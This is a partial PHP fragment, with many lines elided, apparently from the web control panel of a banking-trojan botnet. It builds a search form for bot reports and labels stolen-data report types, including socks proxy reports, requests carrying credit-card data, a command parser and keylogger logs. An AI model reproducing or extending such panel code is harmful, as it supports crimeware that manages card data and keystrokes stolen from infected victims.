...
if($_is_ajax_search || $_is_plain_search)
{
  ...
  
  {
    ...
    {
    $tt = expressionToSql($filter['qstop'], 'path_source', $filter['cs'], 0);
    if(!empty($tt))
    {
      $tt .= ' OR '.expressionToSql($filter['qstop'], 'path_dest', $filter['cs'], 0);
      $tt .= ' OR '.expressionToSql($filter['qstop'], 'context', $filter['cs'], 0);
      $q1[] = '('.$tt.')';
    }
  }
    ...
    str_replace('{WIDTH}', 'auto', THEME_DIALOG_BEGIN).
      ...
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{COLUMNS_COUNT}', 2, THEME_DIALOG_GROUP_BEGIN).
          ...
          str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array(INPUTQ_WIDTH, 'qstop', htmlEntitiesEx($filter['qstop']), 4096), THEME_DIALOG_ITEM_INPUT_TEXT).
          ...
          THEME_DIALOG_ROW_BEGIN.
            ...
            str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
              str_replace(array('{NAME}', '{WIDTH}'), array('blt', 'auto'), THEME_DIALOG_ITEM_LISTBOX_BEGIN).
                ...
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_REQUEST_WITH_CC,       LNG_BLT_REQUEST_WITH_CC),       $filter['blt'] == BLT_REQUEST_WITH_CC       ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
		str_replace(array('{VALUE}', '{TEXT}'), array(BLT_CMDPARSER,             LNG_BLT_CMDPARSER),             $filter['blt'] == BLT_CMDPARSER             ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
  ...
  else
  {
    ...
    while(($m = mysql_fetch_row($r)))
    {
      ...
      switch($m[6])
      {
		...
		case BLT_SOCKS_REPORT:			$text = "Socks report."; break;
		case BLT_REQUEST_WITH_CC:       $text = LNG_BLT_REQUEST_WITH_CC; break;
		case BLT_CMDPARSER:             $text = LNG_BLT_CMDPARSER; break;
		case BLT_KEYLOGGER:             $text = LNG_BLT_KEYLOGGER; break;
